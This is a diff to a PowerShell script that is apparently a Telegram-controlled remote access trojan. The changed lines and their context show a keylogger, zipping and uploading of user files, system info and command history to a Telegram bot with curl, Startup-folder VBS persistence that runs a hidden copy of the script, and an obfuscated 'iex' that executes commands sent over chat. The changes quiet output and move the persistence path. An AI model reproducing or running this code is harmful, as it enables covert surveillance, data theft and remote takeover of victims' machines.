@@ -22,7 +22,7 @@ $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
 
 # Startup Delay
-if(Test-Path "$env:APPDATA\Microsoft\Windows\copy.ps1"){
+if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
 Sleep 15
 }
 
@@ -106,9 +106,9 @@ $maxZipFileSize = 50MB
 $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
-$contents = "$env:COMPUTERNAME Keylogger Started $tick"
+$contents = "$env:COMPUTERNAME $tick Exfiltration Started"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
 
 If($Path -ne $null){
     $foldersToSearch = "$env:USERPROFILE\"+$Path
@@ -155,7 +155,7 @@ foreach ($folder in $foldersToSearch) {
         }
     }
 $zipArchive.Dispose()
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
+curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"  | Out-Null
 rm -Path $zipFilePath -Force
 Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
@@ -227,7 +227,7 @@ While ($true){
     if ($response -match $killphrase) {
         $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
         $params = @{chat_id = $ChatID ;text = $contents}
-        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
         break
     }
 $LastKeypressTime.Restart()
@@ -237,7 +237,7 @@ Start-Sleep -Milliseconds 10
 
 
 Function Persistance{
-$newScriptPath = "$env:APPDATA\Microsoft\Windows\copy.ps1"
+$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
 if ($newScriptPath.Length -lt 100){
@@ -247,11 +247,9 @@ if ($newScriptPath.Length -lt 100){
     sleep 1
     Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
     }
-$attributes = [System.IO.FileAttributes]::Hidden
-Set-ItemProperty -Path $newScriptPath -Name Attributes -Value $attributes
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\copy.ps1""", 0, True
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
 '@
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
@@ -330,7 +328,7 @@ $outpath = "$env:temp\SystemInfo.txt"
 
 $FilePath = "$env:temp\SystemInfo.txt"
 
-curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument"
+curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 Remove-Item -Path $FilePath -Force
 }
 
@@ -351,7 +349,7 @@ $outpath = "$env:temp\SoftwareInfo.txt"
 "Drivers            : $drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 $FilePath = "$env:temp\SoftwareInfo.txt"
-curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument"
+curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 Remove-Item -Path $FilePath -Force
 }
 
@@ -375,7 +373,7 @@ $outpath = "$env:temp\History.txt"
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 $FilePath = "$env:temp\History.txt"
-curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument"
+curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 Remove-Item -Path $FilePath -Force
 }
 
@@ -436,7 +434,7 @@ tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
 $zipFilePath ="$env:temp/TreesOfKnowledge.zip"
 Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $zipFilePath
 sleep 1
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
+curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 rm -Path $zipFilePath -Force
 Write-Output "Done."
 }
@@ -470,12 +468,12 @@ Function IsAdmin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
 $contents = "$closed Session NOT Admin $closed"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 else{
 $contents = "$tick Session IS Admin $tick"
 $params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 }
 
@@ -533,7 +531,7 @@ $messages=rtgmsg
             try{
                 $Result=ie`x($messages.message.text) -ErrorAction Stop
                 $Result
-                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration") -or ($messages.message.text -contains "TreesOfKnowledge")){}
+                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration")){}
                 else{
                 stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
                 }
@@ -542,4 +540,3 @@ $messages=rtgmsg
         }
     }
 }
-
